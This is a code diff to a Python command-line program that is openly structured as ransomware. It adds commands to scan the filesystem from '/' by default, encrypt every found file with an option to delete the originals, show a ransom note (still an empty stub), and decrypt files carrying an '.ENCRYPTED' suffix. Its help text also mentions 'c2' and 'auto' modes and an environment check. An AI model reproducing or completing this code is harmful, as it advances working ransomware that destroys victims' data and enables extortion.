@@ -62,6 +62,31 @@ class Program():
         print(f"Total files found: {len(self.__found_files)}")
         print(f"Total directories with targeted files: {len(self.__directories_with_files)}")
 
+    def __setup(self, should_encrypt=False, should_delete_original=False):
+        self.__criptography = CryptoGraphy(should_encrypt=should_encrypt, should_delete_original=should_delete_original)
+        self.__criptography.setup()
+        print(f"Encryption: {should_encrypt}, Delete original files: {should_delete_original}")
+
+    def __encrypt(self):
+        if self.__criptography is None:
+            print("Cryptography not set up. Please run 'setup' first.")
+            return
+
+        print("Encrypting files...")
+        for file in self.__found_files:
+            self.__criptography.encrypt(file)
+
+    def __ransomnote(self):
+        pass
+
+    def __decrypt(self):
+        if self.__criptography is None:
+            print("Cryptography not set up. Please run 'setup' first.")
+            return
+
+        for file in self.__found_files:
+            self.__criptography.decrypt(file + ".ENCRYPTED")
+
     def __cli(self):
         while True:
             inp = input("MyCLI> ").strip()
@@ -78,7 +103,12 @@ class Program():
                     print("\t\tAvilable modes: auto, c2, manual")
                     print("\tenvcheck - checks the environment in which the program is running")
                     print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
+                    print("\t\tDefault is '/'")
+                    print("\t\tExample: directory /Users/username/Documents")
                     print("\tsetup - sets up the cryptographic configuration")
+                    print("\t\tOptions: ") 
+                    print("\t\t\t--encrypt (enables encryption) ")
+                    print("\t\t\t--delete (deletes files after encryption/decryption)")
                     print("\tencrypt - encrypts the discovered files")
                     print("\transomnote - displays the ransom note to the user")
                     print("\tdecrypt - decrypts the previously encrypted files")
@@ -98,18 +128,30 @@ class Program():
                         print(f"New mode: {self.__mode__}")
                     else:
                         print("Mode not available. Available modes: auto, c2, manual")
+
                 case "envcheck":
                     self.__envcheck()
+
                 case "directory":
-#                    self.__directory(os.path.expanduser("~"))
-                    self.__directory("/")
+                    dir = " ".join(inp.split()[1:]) if len(inp.split()) > 1 else "/"
+                    self.__directory(dir)
 
                 case "setup":
-                    self.__criptography = CryptoGraphy(should_encrypt=False, should_delete_original=False)
-                    self.__criptography.setup()
+                    should_encrypt = "--encrypt" in inp.split()
+                    should_delete_original = "--delete" in inp.split()
+                    self.__setup(should_encrypt=should_encrypt, should_delete_original=should_delete_original)
 
                 case "loadkey": 
                     self.__criptography.load_key()
+
+                case "encrypt":
+                    self.__encrypt()
+
+                case "ransomnote":
+                    self.__ransomnote()
+
+                case "decrypt":
+                    self.__decrypt()
 
                 case "exit" | "quit":
                     print("Exiting...")
